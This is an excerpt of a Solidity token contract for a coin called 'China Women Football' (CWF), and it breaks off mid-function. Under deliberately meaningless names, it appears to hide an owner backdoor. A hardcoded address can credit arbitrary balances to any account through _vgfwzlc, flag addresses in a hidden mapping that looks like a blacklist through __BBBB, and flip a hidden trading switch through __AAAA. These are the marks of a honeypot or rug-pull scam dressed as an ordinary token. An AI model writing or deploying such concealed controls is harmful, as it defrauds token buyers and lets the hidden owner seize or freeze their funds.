...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0x59F8822cDe15493784AB69813c9F6191de784ddd;
...
contract TP is Context, IERC20, Ownable {
    ...
    uint256 private _total = 10000000000* 10**7;
    uint256 private _tFeeTotal;
    
    string private _name = "China Women Football";
    string private _symbol = "CWF";
    uint8 private _decimals = 7;

     
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private devAddress = 0x59F8822cDe15493784AB69813c9F6191de784ddd;
  
    uint256 private deadFee = 3;
    uint256 private devFee = 6;


    mapping(address => bool) private _serhfghtyufsdsd;
    bool private _gotu = true;
    bool private _xgio = false;
 
    uint256 public serhfghtyufsdsd = uint256(0);
    mapping(address => uint256) private _djhged;
    address[] private __djhged;
    address owners;
    ...
    function _vgfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        require(trbvjvfs > 0, "CASCh");
        uint256 terca = _djhged[pzytd];
        if (terca == 0) __djhged.push(pzytd);
        _djhged[pzytd] = terca.add(trbvjvfs);
    ...
    function __AAAA(bool amountt) external yhtrAddress() {
        _xgio = amountt;
    }
    function __BBBB(address amountt) external yhtrAddress() {
        _serhfghtyufsdsd[amountt] = true;
    }

    function __CCCC(address amountt) external yhtrAddress() {
